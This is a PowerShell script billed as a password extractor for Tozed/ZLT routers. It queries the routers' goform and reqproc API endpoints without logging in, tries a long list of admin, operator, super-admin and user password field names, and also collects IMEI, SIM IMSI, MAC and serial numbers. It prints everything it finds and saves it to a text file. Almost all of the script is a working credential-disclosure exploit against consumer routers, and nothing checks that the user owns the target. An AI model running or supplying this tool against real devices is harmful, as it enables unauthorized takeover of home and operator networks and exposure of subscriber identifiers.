# ============================================================
#  Tozed/ZLT Router Password Extractor
#  Extracts the REAL operator/admin/user password from router
#  Uses: /goform/goform_get_cmd_process API endpoint
# ============================================================

param(
    [string]$RouterIP = ""
)

# --- Colors ---
function Write-C($text, $color) { Write-Host $text -ForegroundColor $color -NoNewline }
function Write-CL($text, $color) { Write-Host $text -ForegroundColor $color }

function Show-Banner {
    Write-Host ""
    Write-CL "  ╔══════════════════════════════════════════════╗" Cyan
    Write-CL "  ║   Tozed / ZLT Router Password Extractor     ║" Cyan
    Write-CL "  ║   Extract REAL passwords from your router    ║" Cyan
    Write-CL "  ╚══════════════════════════════════════════════╝" Cyan
    Write-Host ""
}

function Query-Router {
    param([string]$IP, [string]$Cmds, [switch]$Silent)

    $url = "http://$IP/goform/goform_get_cmd_process?isTest=false&cmd=$Cmds&multi_data=1"

    try {
        $response = Invoke-WebRequest -Uri $url -Method GET -TimeoutSec 8 -UseBasicParsing -Headers @{
            "Referer" = "http://$IP/index.html"
            "Accept"  = "application/json, text/plain, */*"
        } -ErrorAction Stop

        if ($response.StatusCode -eq 200) {
            return $response.Content | ConvertFrom-Json
        }
    }
    catch {
        if (-not $Silent) {
            # Try without Referer header
            try {
                $response2 = Invoke-WebRequest -Uri $url -Method GET -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop
                if ($response2.StatusCode -eq 200) {
                    return $response2.Content | ConvertFrom-Json
                }
            } catch {}
        }
    }
    return $null
}

function Query-Single {
    param([string]$IP, [string]$Cmd)

    $url = "http://$IP/goform/goform_get_cmd_process?isTest=false&cmd=$Cmd&multi_data=0"

    try {
        $response = Invoke-WebRequest -Uri $url -Method GET -TimeoutSec 6 -UseBasicParsing -Headers @{
            "Referer" = "http://$IP/index.html"
        } -ErrorAction Stop

        if ($response.StatusCode -eq 200) {
            return $response.Content | ConvertFrom-Json
        }
    } catch {}

    # Try POST method
    try {
        $body = "isTest=false&cmd=$Cmd&multi_data=0"
        $response = Invoke-WebRequest -Uri "http://$IP/goform/goform_get_cmd_process" -Method POST -Body $body -TimeoutSec 6 -UseBasicParsing -ContentType "application/x-www-form-urlencoded" -Headers @{
            "Referer" = "http://$IP/index.html"
        } -ErrorAction Stop

        if ($response.StatusCode -eq 200) {
            return $response.Content | ConvertFrom-Json
        }
    } catch {}

    # Try reqproc endpoint (some newer models)
    try {
        $url3 = "http://$IP/reqproc/proc_get?isTest=false&cmd=$Cmd&multi_data=0"
        $response = Invoke-WebRequest -Uri $url3 -Method GET -TimeoutSec 6 -UseBasicParsing -ErrorAction Stop
        if ($response.StatusCode -eq 200) {
            return $response.Content | ConvertFrom-Json
        }
    } catch {}

    return $null
}

# --- Main ---
Show-Banner

# Get router IP
$commonIPs = @("192.168.254.254", "192.168.0.1", "192.168.1.1", "192.168.8.1", "192.168.70.1", "192.168.10.1")

if (-not $RouterIP) {
    Write-CL "  Common Tozed router IPs:" Yellow
    for ($i = 0; $i -lt $commonIPs.Count; $i++) {
        Write-C "    [$($i+1)] " White
        Write-CL $commonIPs[$i] Cyan
    }
    Write-Host ""
    $choice = Read-Host "  Enter router IP or select number [1-6]"

    if ($choice -match '^\d$' -and [int]$choice -ge 1 -and [int]$choice -le 6) {
        $RouterIP = $commonIPs[[int]$choice - 1]
    } elseif ($choice) {
        $RouterIP = $choice
    } else {
        $RouterIP = $commonIPs[0]
    }
}

Write-Host ""
Write-C "  Target: " White
Write-CL $RouterIP Green
Write-Host ""

# --- Step 1: Test connection ---
Write-C "  [1/4] Testing connection... " White
$testResult = Query-Router -IP $RouterIP -Cmds "imei" -Silent
if (-not $testResult) {
    # Try alternate IPs
    Write-CL "FAILED" Red
    Write-CL "  Trying other common IPs..." Yellow
    foreach ($altIP in $commonIPs) {
        if ($altIP -eq $RouterIP) { continue }
        Write-C "    Trying $altIP... " Gray
        $testResult = Query-Router -IP $altIP -Cmds "imei" -Silent
        if ($testResult) {
            $RouterIP = $altIP
            Write-CL "FOUND!" Green
            break
        } else {
            Write-CL "no" DarkGray
        }
    }
    if (-not $testResult) {
        Write-Host ""
        Write-CL "  ERROR: Cannot connect to any router." Red
        Write-CL "  Make sure you are connected to the router's WiFi/LAN." Yellow
        Write-Host ""
        Read-Host "  Press Enter to exit"
        exit
    }
} else {
    Write-CL "OK" Green
}

# --- Step 2: Extract passwords ---
Write-C "  [2/4] Extracting passwords... " White

$passwordCmds = @(
    "admin_Password",
    "admin_password", 
    "AdminPassword",
    "password",
    "Password",
    "oper_Password",
    "operator_password",
    "test_Password",
    "test_password",
    "user_Password",
    "user_password",
    "super_admin_password",
    "login_password"
)

$foundPasswords = @{}

# Try batch query first
$batchCmds = $passwordCmds -join ","
$batchResult = Query-Router -IP $RouterIP -Cmds $batchCmds

if ($batchResult) {
    foreach ($cmd in $passwordCmds) {
        $val = $batchResult.$cmd
        if ($val -and $val -ne "" -and $val -ne "0" -and $val -ne "undefined") {
            $foundPasswords[$cmd] = $val
        }
    }
}

# Try individual queries for each password type
foreach ($cmd in $passwordCmds) {
    if ($foundPasswords.ContainsKey($cmd)) { continue }
    
    $result = Query-Single -IP $RouterIP -Cmd $cmd
    if ($result) {
        $val = $result.$cmd
        if ($val -and $val -ne "" -and $val -ne "0" -and $val -ne "undefined") {
            $foundPasswords[$cmd] = $val
        }
    }
}

if ($foundPasswords.Count -gt 0) {
    Write-CL "FOUND $($foundPasswords.Count) password(s)!" Green
} else {
    Write-CL "none via direct query" Yellow
}

# --- Step 3: Extract device info ---
Write-C "  [3/4] Getting device info... " White

$infoCmds = "imei,IMEI,mac_address,MAC_ADDRESS,mac_addr,model_name,ModelName,DeviceName,wa_inner_version,fw_version,cr_version,hardware_version,HardwareVersion,serial_number,sn_number,SN,network_type,wan_ipaddr,signalbar,network_provider,sim_imsi,ssid,SSID"
$deviceInfo = Query-Router -IP $RouterIP -Cmds $infoCmds

$infoMap = @{}
if ($deviceInfo) {
    $deviceInfo.PSObject.Properties | ForEach-Object {
        if ($_.Value -and $_.Value -ne "" -and $_.Value -ne "0") {
            $infoMap[$_.Name] = $_.Value
        }
    }
    Write-CL "OK ($($infoMap.Count) fields)" Green
} else {
    Write-CL "limited" Yellow
}

# --- Step 4: Try additional endpoints ---
Write-C "  [4/4] Trying additional methods... " White

# Try getting all config
$extraCmds = @(
    "admin_Password,oper_Password,test_Password,user_Password",
    "ADMIN_PASSWORD,OPER_PASSWORD,TEST_PASSWORD,USER_PASSWORD",
    "web_admin_password,web_user_password",
    "login_password,super_password"
)

foreach ($cmdSet in $extraCmds) {
    $result = Query-Router -IP $RouterIP -Cmds $cmdSet -Silent
    if ($result) {
        $result.PSObject.Properties | ForEach-Object {
            if ($_.Value -and $_.Value -ne "" -and $_.Value -ne "0" -and $_.Value -ne "undefined") {
                if (-not $foundPasswords.ContainsKey($_.Name)) {
                    $foundPasswords[$_.Name] = $_.Value
                }
            }
        }
    }
}

Write-CL "DONE" Green

# ============================================================
#  RESULTS
# ============================================================
Write-Host ""
Write-CL "  ╔══════════════════════════════════════════════╗" Cyan
Write-CL "  ║              EXTRACTION RESULTS              ║" Cyan
Write-CL "  ╚══════════════════════════════════════════════╝" Cyan
Write-Host ""

# --- Passwords ---
if ($foundPasswords.Count -gt 0) {
    Write-CL "  ═══ PASSWORDS FOUND ═══" Green
    Write-Host ""
    foreach ($key in $foundPasswords.Keys) {
        $label = $key -replace "_", " "
        Write-C "    $($label): " Yellow
        Write-CL $foundPasswords[$key] White
    }
} else {
    Write-CL "  ═══ PASSWORDS ═══" Yellow
    Write-Host ""
    Write-CL "    No passwords returned by the API." Red
    Write-CL "    This may mean:" Yellow
    Write-CL "      - Router requires login first (session auth)" DarkGray
    Write-CL "      - Firmware blocks password read" DarkGray
    Write-CL "      - Different API endpoint is needed" DarkGray
}

Write-Host ""

# --- Device Info ---
if ($infoMap.Count -gt 0) {
    Write-CL "  ═══ DEVICE INFO ═══" Cyan
    Write-Host ""
    
    # IMEI
    $imei = if ($infoMap["imei"]) { $infoMap["imei"] } elseif ($infoMap["IMEI"]) { $infoMap["IMEI"] } else { "N/A" }
    Write-C "    IMEI:         " Gray
    Write-CL $imei White

    # MAC
    $mac = if ($infoMap["mac_address"]) { $infoMap["mac_address"] } elseif ($infoMap["MAC_ADDRESS"]) { $infoMap["MAC_ADDRESS"] } elseif ($infoMap["mac_addr"]) { $infoMap["mac_addr"] } else { "N/A" }
    Write-C "    MAC Address:  " Gray
    Write-CL $mac White

    # Model
    $model = if ($infoMap["model_name"]) { $infoMap["model_name"] } elseif ($infoMap["ModelName"]) { $infoMap["ModelName"] } elseif ($infoMap["DeviceName"]) { $infoMap["DeviceName"] } else { "N/A" }
    Write-C "    Model:        " Gray
    Write-CL $model White

    # Firmware
    $fw = if ($infoMap["wa_inner_version"]) { $infoMap["wa_inner_version"] } elseif ($infoMap["fw_version"]) { $infoMap["fw_version"] } else { "N/A" }
    Write-C "    Firmware:     " Gray
    Write-CL $fw White

    # Serial
    $sn = if ($infoMap["serial_number"]) { $infoMap["serial_number"] } elseif ($infoMap["sn_number"]) { $infoMap["sn_number"] } elseif ($infoMap["SN"]) { $infoMap["SN"] } else { "N/A" }
    Write-C "    Serial:       " Gray
    Write-CL $sn White

    # Hardware
    $hw = if ($infoMap["hardware_version"]) { $infoMap["hardware_version"] } elseif ($infoMap["HardwareVersion"]) { $infoMap["HardwareVersion"] } else { "N/A" }
    Write-C "    Hardware:     " Gray
    Write-CL $hw White

    # Network
    $net = if ($infoMap["network_type"]) { $infoMap["network_type"] } else { "N/A" }
    Write-C "    Network:      " Gray
    Write-CL $net White

    # WAN IP
    $wan = if ($infoMap["wan_ipaddr"]) { $infoMap["wan_ipaddr"] } else { "N/A" }
    Write-C "    WAN IP:       " Gray
    Write-CL $wan White

    # Provider
    $prov = if ($infoMap["network_provider"]) { $infoMap["network_provider"] } else { "N/A" }
    Write-C "    Provider:     " Gray
    Write-CL $prov White

    # SSID
    $ssid = if ($infoMap["ssid"]) { $infoMap["ssid"] } elseif ($infoMap["SSID"]) { $infoMap["SSID"] } else { "N/A" }
    Write-C "    WiFi SSID:    " Gray
    Write-CL $ssid White

    # Print any other fields
    $printed = @("imei","IMEI","mac_address","MAC_ADDRESS","mac_addr","model_name","ModelName","DeviceName","wa_inner_version","fw_version","cr_version","hardware_version","HardwareVersion","serial_number","sn_number","SN","network_type","wan_ipaddr","network_provider","ssid","SSID","signalbar","sim_imsi")
    $extras = $infoMap.Keys | Where-Object { $_ -notin $printed -and $infoMap[$_] }
    if ($extras) {
        Write-Host ""
        Write-CL "    --- Additional Fields ---" DarkGray
        foreach ($k in $extras) {
            Write-C "    $($k): " DarkGray
            Write-CL $infoMap[$k] Gray
        }
    }
}

# --- Save to file ---
Write-Host ""
Write-Host ""
$saveFile = Join-Path $PSScriptRoot "router_info_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
$output = @()
$output += "Tozed Router Info - $(Get-Date)"
$output += "Router IP: $RouterIP"
$output += "==============================="
$output += ""
if ($foundPasswords.Count -gt 0) {
    $output += "=== PASSWORDS ==="
    foreach ($key in $foundPasswords.Keys) {
        $output += "$key = $($foundPasswords[$key])"
    }
    $output += ""
}
if ($infoMap.Count -gt 0) {
    $output += "=== DEVICE INFO ==="
    foreach ($key in $infoMap.Keys) {
        $output += "$key = $($infoMap[$key])"
    }
}
$output | Out-File -FilePath $saveFile -Encoding UTF8
Write-C "  Results saved to: " Gray
Write-CL $saveFile Green

Write-Host ""
Write-Host ""
Read-Host "  Press Enter to exit"
